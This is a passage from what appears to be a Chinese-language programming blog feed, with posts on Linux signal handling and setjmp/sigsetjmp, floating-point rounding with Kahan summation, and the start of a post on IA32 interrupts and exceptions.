class="type">unsigned</span> <span class="type">int</span> secs)</span>;</span><br><span class="line">在secs秒后    发送一个SIGALRM信号给调用进程 secs为<span class="number">0</span>不会调度安排新闹钟，任何情况下都会取消待处理(pending)的闹钟，返回剩余秒数，没有待处理的闹钟返回<span class="number">0</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="接受信号"><a href="#接受信号" class="headerlink" title="接受信号"></a>接受信号</h2><p>隐式阻塞机制</p><blockquote><p>内核默认阻塞任何当前处理程序正在处理信号类型的待处理的信号。也就是信号处理程序执行时不接受正在处理类型的信号</p></blockquote><p>显示阻塞机制</p><blockquote><p>应用程序可以使用 sigprocmask 函数和它的辅助函数，来设置信号屏蔽字，明确地阻塞和解除阻塞选定的信号。<strong>SIGKILL 和 SIGSTOP 不能被阻塞</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>;</span><br><span class="line">how 值：</span><br><span class="line">SIG_BLOCK:把<span class="built_in">set</span>里信号添加到blocked列表</span><br><span class="line">SIG_UNBLOCK:从blocked里删除<span class="built_in">set</span>里的信号</span><br><span class="line">SIG_SETMASK:block=<span class="built_in">set</span></span><br><span class="line">把旧的blocked保存到oldset</span><br><span class="line"><span class="built_in">set</span> 为<span class="literal">NULL</span>，读取现在的屏蔽值</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sigemptyset(<span class="type">sigset_t</span> *<span class="built_in">set</span>);</span><br><span class="line">初始化<span class="built_in">set</span>为<span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line">所有信号填入<span class="built_in">set</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">填入signum</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigdelset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">删除signum</span><br><span class="line">返回：如果成功则为 o, 若出错则为<span class="number">-1</span> 。</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigismember</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line">返回：若 signum 是 <span class="built_in">set</span> 的成员则为 <span class="number">1</span>, 如果不是则为 <span class="number">0</span> 若出错则为<span class="number">-1</span></span><br></pre></td></tr></table></figure></blockquote><p>显示阻塞并不是被直接丢弃了，在恢复阻塞后，还可以接收到</p><h2 id="修改和信号相关联的默认行为"><a href="#修改和信号相关联的默认行为" class="headerlink" title="修改和信号相关联的默认行为"></a>修改和信号相关联的默认行为</h2><p>IGSTOP和SIGKILL不能修改</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">sighandler_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">sighandler_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">sighandler_t</span> handler)</span>;</span><br><span class="line">返回：若成功则为指向前次处理程序的指针，若出错则为SIG_ERRC不设置errno);</span><br><span class="line">handler 是SIG_IGN 忽略signum该类型信号;</span><br><span class="line">handler 是SIG_DFL signum恢复默认行为;</span><br><span class="line">handler 是个函数地址 设置该函数为异常处理函数</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br><span class="line">^Cctrl c</span><br></pre></td></tr></table></figure><p>处理程序结束后会返回到断点处继续</p><p>阻塞掉SIGINT信号</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ctrl c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK,&amp;mask,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGINT, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -g -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^C^Z</span><br><span class="line">fish: Job 6, &#x27;./test&#x27; has stopped</span><br></pre></td></tr></table></figure><h3 id="非本地跳转"><a href="#非本地跳转" class="headerlink" title="非本地跳转"></a>非本地跳转</h3><p>整数除0会SIGFPE</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">fish: Job 1, &#x27;./test&#x27; terminated by signal SIGFPE (Floating point exception)</span><br></pre></td></tr></table></figure><p>本来想着改掉SIGFPE的默认处理，看看整数除0后结果是什么样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    z = z / t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果忘了信号处理函数过后会返回到断点处，也就是导致这个异常的语句处z &#x3D; z &#x2F; t;然后就会一直导致SIGFPE，goto只能实现函数内的跳转，其实goto在汇编层就是一个无条件的跳转jmp，他也没能力实现函数间的跳转，除非他能把栈给平了，寄存器修正了</p><p>使用setjmp就可以做到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setjmp</span><span class="params">(jmp_buf env)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sigsetjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> savesigs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">siglongjmp</span><span class="params">(sigjmp_buf env, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure><p>setjmp把当前程序各种信息保存到env里(typically, the stack pointer, the instruction pointer,  possibly  the  values  of other registers and the signal mask),直接调用返回0，</p><p>longjmp利用最近一次保存的env来恢复之前的环境，成功调用后不返回，原来的setjmp会再次返回第二个参数val的值</p><p>sigsetjmp和setjmp差不多只是，sigsetjmp只要第二个参数不为0就会保存信号屏蔽字，jmp过来时恢复，sigset不会</p><p>手册原话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sigsetjmp() and <span class="title function_">siglongjmp</span><span class="params">()</span></span><br><span class="line">       <span class="title function_">sigsetjmp</span><span class="params">()</span>  and  <span class="title function_">siglongjmp</span><span class="params">()</span> also perform nonlocal gotos, but provide</span><br><span class="line">       predictable handling of the process signal mask.</span><br><span class="line"></span><br><span class="line">       If, and only <span class="keyword">if</span>, the savesigs argument provided to <span class="title function_">sigsetjmp</span><span class="params">()</span> is  non‐</span><br><span class="line">       zero, the process&#x27;s current signal mask is saved in env and will be re‐</span><br><span class="line">       stored <span class="keyword">if</span> a <span class="title function_">siglongjmp</span><span class="params">()</span> is later performed with this env.</span><br></pre></td></tr></table></figure><p>sigpending()用于获取当前进程已经被阻塞但尚未处理的信号集合</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// if (sigsetjmp(env, 666) != 0) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (setjmp(env) != <span class="number">0</span>) &#123;</span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;pendmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in pendmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in pendmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">//时间间隔我疯狂按ctrl c :)</span></span><br><span class="line">    <span class="comment">// siglongjmp(env, 1);</span></span><br><span class="line">    longjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用sigsetjmp时</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>使用setjmp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^C^C^C^Cin blockmask</span><br><span class="line">in pendmask</span><br></pre></td></tr></table></figure><p>WTF 看来是我之前理解错了，他们都不会清除当前的信号屏蔽字和已经被阻塞但尚未处理的信号集合</p><p>gdb看下</p><p>setjmp(env) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0xfa3c37809f472823</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0xfa3c378098a72823</span>, <span class="number">0xaf6962d587272823</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x0</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x0</span> &lt;repeats <span class="number">16</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp(env, 666) !&#x3D; 0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x env</span><br><span class="line">$<span class="number">2</span> = &#123;&#123;</span><br><span class="line">    __jmpbuf = &#123;<span class="number">0x0</span>, <span class="number">0x6cdae548d2b8f980</span>, <span class="number">0x7fffffffdfd8</span>, <span class="number">0x555555555269</span>, <span class="number">0x555555557d78</span>, <span class="number">0x7ffff7ffd040</span>, <span class="number">0x6cdae548d558f980</span>, <span class="number">0x398fb01dcad2f980</span>&#125;,</span><br><span class="line">    __mask_was_saved = <span class="number">0x1</span>,</span><br><span class="line">    __saved_mask = &#123;</span><br><span class="line">      __val = &#123;<span class="number">0x2</span>, <span class="number">0x0</span> &lt;repeats <span class="number">15</span> times&gt;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp确实保存了signal mask</p><p>那应该就是sigsetjmp最后会比setjmp多一个恢复过程</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">sigset_t</span> mask, pendmask, blockmask;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nctrl+\\\n&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// longjmp(env, 1);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    assert(sigemptyset(&amp;mask)==<span class="number">0</span>);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGQUIT, signal_handler);<span class="comment">/*ctrl+\*/</span></span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// if (setjmp(env) != 0) &#123;</span></span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);<span class="comment">//取消阻塞</span></span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">/*按下ctrl+\*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp时</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">in blockmask</span><br></pre></td></tr></table></figure><p>setjmp时</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">not in blockmask</span><br></pre></td></tr></table></figure><p>是这个意思了，这么简单的东西刚开始居然理解错了，艹</p><p>完成一下最初想做的事</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) ==<span class="number">0</span> ) &#123;</span><br><span class="line">        z = z / t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">xxx</span><br><span class="line">12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kahan</title>
      <link href="/2023/04/23/floating-point-calculation-and-kahan/"/>
      <url>/2023/04/23/floating-point-calculation-and-kahan/</url>
      
        <content type="html"><![CDATA[<h2 id="Floating-point-Calculation"><a href="#Floating-point-Calculation" class="headerlink" title="Floating-point Calculation"></a>Floating-point Calculation</h2><p>Kahan前复习一些浮点数的运算</p><p>A&#x3D;Ma*2<sup>Ea</sup></p><p>B&#x3D;Mb*2<sup>Eb</sup></p><p>假设(Ea&gt;&#x3D;Eb)</p><p>A±B&#x3D;(Ma±Mb*2<sup>Eb-Ea</sup>)*2<sup>Ea</sup></p><p>A*B&#x3D;(Ma*Mb)*2<sup>Ea+Eb</sup></p><p>A&#x2F;B&#x3D;(Ma&#x2F;Mb)*2<sup>Ea-Eb</sup></p><p>加减法先求阶差，小的阶码往大的转换，所以小的阶码的有效数需要右移两阶码差的绝对值，如果右移的过程中出现移出的情况，会把移出的位保存到临时的附加位上，有效数相加，结果规格化</p><p>运算过程中可能出现以下几种情况</p><ul><li>除以0</li><li>阶码上溢，单精度&gt; 127 ±inf</li><li>阶码下溢出，单精度&lt; -126 ±0</li><li>有效数溢出 例如11.01 需要右归，需要把可能移出的位保存到临时附加位，这里最多右移一位，因为两有效数之和不可能达到4，所以有效数整数部分最多2位(11.)，保留一个1(1.)，最多右移一位</li><li>非规格化有效数，如0.11 需要左归</li><li>有效数全零，需要把阶码也置全零</li></ul><p>因为有了附加位精度会得到提升，但是也需要依靠附加位做舍入</p><p>IEEE 754给出了四种rounding方式</p><ul><li>就近舍入(默认)<ul><li>舍入到最接近，在一样接近的情况下偶数优先(二进制里以0结尾的)</li></ul></li><li>向+inf舍入</li><li>向-inf舍入</li><li>向0舍入</li></ul><h2 id="Kahan"><a href="#Kahan" class="headerlink" title="Kahan"></a>Kahan</h2><p>先看段代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 40000000</span></span><br><span class="line"><span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">float</span> test;</span><br><span class="line">test= <span class="number">1234567890</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,test);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    sum += <span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line"><span class="number">1234567936.000000</span></span><br><span class="line"><span class="number">2097152.000000</span></span><br></pre></td></tr></table></figure><p>结果并没有我们想的那样误差非常大</p><p>造成这种现象的原因主要有</p><p>0.1在内的好多数在我们浮点数里的无法精确表示 0 01111011 10011001100110011001101 有效数1001无效循环，类似与十进制的三分之一，相加的时候由于需要小的阶码往大的转换，小的有效数需要右移(我们的附加位有限)，两数相差小时，精度损失，当两数相差过大时，甚至存在大数吃小数的情况(右移成0.0的情况)，同时由于我们单精度浮点数有效数是23位，外加一个隐藏的1 可以表示十进制有效位数log(2<sup>24</sup>)约等于7位</p><p><strong>误差补偿算法Kahan</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    y = <span class="number">0.1</span> - c;</span><br><span class="line">    t = sum2 + y;</span><br><span class="line">    c = (t - sum2) - y;</span><br><span class="line">    sum2 = t;</span><br><span class="line">&#125;</span><br><span class="line">sum2-=c；</span><br></pre></td></tr></table></figure><p>主要思想就是计算出每次累计的舍入误差，添加到下一次计算上</p><p>c是对丢失的低位进行运算补偿的变量</p><p>当我们的sum2和y相差过大时，t会得到一个已经产生误差的值，我们用这个值去剪原来的sum2(他们的两数相差不是很大，结果比较准确)然后减去这次的加数(同样两数相差不大，结果准确)就可以计算出这次计算的误差值，在下一次加法时去用这个误差修正结果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 400000000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> sum2 = <span class="number">0</span>, y = <span class="number">0</span>, t = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        sum += <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        y = <span class="number">0.1</span> - c;</span><br><span class="line">        t = sum2 + y;</span><br><span class="line">        c = (t - sum2) - y;</span><br><span class="line">        sum2 = t;</span><br><span class="line">    &#125;</span><br><span class="line">    sum2 -= c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, sum2);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">2097152.000000</span><br><span class="line">40000000.000000⏎  </span><br></pre></td></tr></table></figure><p>同时也可以看到这次我在TIMES比第一次后面多加了一个0，第一种累计法结果还是2097152.000000,也印证了相差过大时大数字会把小数字完全吃掉，本例中0.1阶码01111011&#x3D;123-127&#x3D;-4，2097152阶码10010100&#x3D;148-127&#x3D;21</p><p>0.1有效数需要右移25位，但是他的有效数算上隐藏1最多24位，推测一下应该有一位的附加位作保护位</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IA32 Interrupt And Exception</title>
      <link href="/2023/04/22/IA32-Interrupt-Exception/"/>
      <url>/2023/04/22/IA32-Interrupt-Exception/</url>
      
        <content type="html"><![CDATA[<h1 id="IA32-Interrupt-And-Exception"><a href="#IA32-Interrupt-And-Exception" class="headerlink" title="IA32 Interrupt And Exception"></a>IA32 Interrupt And Exception</h1><p>不同体系中断和异常的定义内涵不太一样，可以理解，但是同一体系的不同教科书也不太一样，淦了</p><p>最后还是去读了一波intel的手册,RTFM!!!，在64-ia-32-architectures-software-developer-vol-3a-part-1-manual的chapter 6</p><p><a href="https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html">https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html</a></p><h3 id="EFLAGS寄存器"><a href="#EFLAGS寄存器" class="headerlink" title="EFLAGS寄存器"></a>EFLAGS寄存器</h3><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194723461.png" alt="image-20230422194723461"></p><h2 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h2><p>The processor receives interrupts from two sources:<br>• External (hardware generated) interrupts.<br>• Software-generated interrupts.(如int n来调用n中断)</p><p>通常是由CPU外部的输入输出设备（硬件）所触发的，希望cpu停下手里的任务去执行对应得中断处理程序，之后再回到手里任务来，所以中断是异步的，被叫做异步中断或硬件中断</p><p>cpu提供了两引脚</p><p>INTR（INTeRrupt）可屏蔽中断(maskable interrupt)通过INTR向CPU发生请求</p><p>NMI（Non Maskable Interrupt）不可屏蔽中断(nonmaskable interrupt)通过NMI向CPU发生请求</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194043252.png" alt="image-20230422194043252"></p><p>可以通过CLI清除EFLAGS寄存器里IF(Interrupt enable Flag)位(IF&#x3D;0)来禁止可屏蔽中断发生，STI(IF&#x3D;1)允许可屏蔽中断发生(IA32只有在响应中断时把IF&#x3D;0关闭中断，响应异常的时候不会关闭)</p><p>不可屏蔽中断，意如其名</p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>The processor receives exceptions from three sources:<br>• Processor-detected program-error exceptions.<br>• Software-generated exceptions.<br>• Machine-check 